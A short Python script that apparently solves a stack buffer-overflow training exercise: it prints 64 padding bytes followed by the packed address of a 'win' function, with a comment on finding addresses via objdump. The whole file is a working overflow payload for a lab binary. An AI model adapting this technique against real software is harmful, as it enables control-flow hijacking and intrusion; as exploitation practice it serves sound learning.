import struct

padding = "A" * 64

# Addresss of the win function
# You can find the address of a function or variable by analyzing the output of 'objdump -t'
addr = 0x08048424

# Value that will be written to the target variable
value = struct.pack("I", addr)

print(padding + value)
